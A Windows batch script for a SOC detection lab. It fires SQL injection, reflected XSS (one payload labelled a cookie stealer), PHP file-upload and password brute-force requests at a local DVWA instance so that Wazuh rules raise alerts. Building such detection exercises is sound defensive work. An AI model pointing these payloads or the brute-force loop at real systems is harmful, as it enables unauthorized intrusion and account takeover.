@echo off
setlocal enabledelayedexpansion

REM ============================================================================
REM Mini SOC Attack Simulator Script (Windows)
REM ============================================================================
REM Purpose: Execute automated attack scenarios for demonstration on Windows
REM Usage: attack.bat
REM ============================================================================

REM Configuration
set DVWA_URL=http://localhost:8080
set ATTACK_DELAY=2

echo ===================================================================
echo   Mini SOC - Automated Attack Simulator (Windows)
echo ===================================================================
echo.

REM Check if DVWA is accessible
echo [*] Checking DVWA connectivity...
curl -s --head "%DVWA_URL%" >nul
if errorlevel 1 (
    echo [!] Cannot reach DVWA at %DVWA_URL%
    echo [!] Make sure to run: start.bat
    pause
    exit /b 1
)
echo [+] DVWA is accessible
echo.

:menu
echo Select attack scenarios to execute:
echo 1. SQL Injection (SQLi)
echo 2. Cross-Site Scripting (XSS)
echo 3. File Upload
echo 4. Brute Force
echo 5. All Attacks
echo 6. Exit
echo.
set /p choice=Enter your choice (1-6): 

if "%choice%"=="1" goto sqli
if "%choice%"=="2" goto xss
if "%choice%"=="3" goto upload
if "%choice%"=="4" goto brute
if "%choice%"=="5" goto all
if "%choice%"=="6" exit /b 0

echo [!] Invalid choice
echo.
goto menu

:sqli
echo.
echo [*] Starting SQL Injection attacks...
echo [*] Attack 1: Authentication Bypass
curl -s "%DVWA_URL%/vulnerabilities/sqli/?id=admin%%27%%20OR%%20%%271%%27%%3D%%271" >nul
echo [+] Payload sent: admin' OR '1'='1
timeout /t %ATTACK_DELAY% /nobreak >nul

echo [*] Attack 2: UNION-based SQLi
curl -s "%DVWA_URL%/vulnerabilities/sqli/?id=1%%27%%20UNION%%20SELECT%%20user%%28%%29%%2Cdatabase%%28%%29%%20--" >nul
echo [+] Payload sent: 1' UNION SELECT user(),database() --
timeout /t %ATTACK_DELAY% /nobreak >nul

echo [*] Attack 3: Data Extraction
curl -s "%DVWA_URL%/vulnerabilities/sqli/?id=1%%27%%20OR%%20%%271%%27%%3D%%271%%20--" >nul
echo [+] Payload sent: 1' OR '1'='1 --
timeout /t %ATTACK_DELAY% /nobreak >nul

echo.
echo [+] SQL Injection attacks completed
echo [*] Check Wazuh Dashboard for Rule ID: 100100 alerts
echo.
if not "%choice%"=="5" goto menu
if "%choice%"=="5" goto xss_all

:xss
echo.
echo [*] Starting Cross-Site Scripting attacks...
:xss_all
echo [*] Attack 1: Basic Script Injection
curl -s -L "%DVWA_URL%/vulnerabilities/xss_r/?name=%%3Cscript%%3Ealert%%28%%27XSS%%20Test%%27%%29%%3C%%2Fscript%%3E" >nul
echo [+] Payload sent: ^<script^>alert('XSS Test')^</script^>
timeout /t %ATTACK_DELAY% /nobreak >nul

echo [*] Attack 2: Event Handler Injection
curl -s -L "%DVWA_URL%/vulnerabilities/xss_r/?name=%%3Cimg%%20src%%3Dx%%20onerror%%3Dalert%%28%%27XSS%%27%%29%%3E" >nul
echo [+] Payload sent: ^<img src=x onerror=alert('XSS')^>
timeout /t %ATTACK_DELAY% /nobreak >nul

echo [*] Attack 3: Cookie Stealer
curl -s -L "%DVWA_URL%/vulnerabilities/xss_r/?name=%%3Cscript%%3Ealert%%28document.cookie%%29%%3C%%2Fscript%%3E" >nul
echo [+] Payload sent: ^<script^>alert(document.cookie)^</script^>
timeout /t %ATTACK_DELAY% /nobreak >nul

echo.
echo [+] XSS attacks completed
echo [*] Check Wazuh Dashboard for Rule ID: 100200 alerts
echo.
if not "%choice%"=="5" goto menu
if "%choice%"=="5" goto upload_all

:upload
echo.
echo [*] Starting File Upload attacks...
:upload_all
REM Create test files
echo ^<?php echo 'Uploaded successfully'; ?^> > "%TEMP%\test.php"
echo test content > "%TEMP%\test.txt"

echo [*] Attack 1: PHP File Upload
curl -s -F "uploaded_file=@%TEMP%\test.php" "%DVWA_URL%/vulnerabilities/upload/" >nul
echo [+] PHP file uploaded
timeout /t %ATTACK_DELAY% /nobreak >nul

echo [*] Attack 2: Text File Upload
curl -s -F "uploaded_file=@%TEMP%\test.txt" "%DVWA_URL%/vulnerabilities/upload/" >nul
echo [+] TXT file uploaded
timeout /t %ATTACK_DELAY% /nobreak >nul

REM Cleanup
del "%TEMP%\test.php" "%TEMP%\test.txt"

echo.
echo [+] File upload attacks completed
echo [*] Check Wazuh Dashboard for Rule ID: 100300 alerts
echo.
if not "%choice%"=="5" goto menu
if "%choice%"=="5" goto brute_all

:brute
echo.
echo [*] Starting Brute Force attacks...
:brute_all
set PASSWORDS=password admin 123456 dvwa wrong

for /L %%i in (1,1,3) do (
    for %%p in (%PASSWORDS%) do (
        echo [*] Attempt %%i: admin:%%p
        curl -s -X POST "%DVWA_URL%/vulnerabilities/brute/" -d "username=admin&password=%%p&Login=Login" >nul
        timeout /t 1 /nobreak >nul
    )
)

echo.
echo [+] Brute Force attacks completed
echo [*] Check Wazuh Dashboard for Rule ID: 100400 alerts
echo.
if not "%choice%"=="5" goto menu
goto end

:all
goto sqli

:end
echo.
echo ===================================================================
echo [+] All selected attack scenarios completed!
echo ===================================================================
echo.
echo Next steps:
echo 1. Access Wazuh Dashboard: https://localhost:5601
echo 2. Navigate to: Security Events
echo 3. Check for alerts matching your attack scenarios
echo.
echo Expected Alert Rule IDs:
echo   - SQLi: 100100, 100101, 100102
echo   - XSS: 100200, 100201, 100202
echo   - File Upload: 100300, 100301
echo   - Brute Force: 100400, 100401
echo.
pause
goto menu
